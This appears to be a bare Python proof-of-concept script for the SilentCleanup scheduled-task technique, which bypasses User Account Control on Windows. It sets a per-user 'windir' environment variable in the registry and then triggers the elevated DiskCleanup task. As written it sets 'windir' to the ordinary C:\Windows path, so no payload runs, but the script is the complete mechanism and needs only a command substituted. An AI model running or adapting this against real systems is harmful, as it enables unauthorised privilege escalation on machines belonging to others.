import winreg, subprocess
with winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Environment') as key:
    winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, r'C:\Windows')
subprocess.run(['schtasks.exe', '/Run', '/TN', r'\Microsoft\Windows\DiskCleanup\SilentCleanup'])
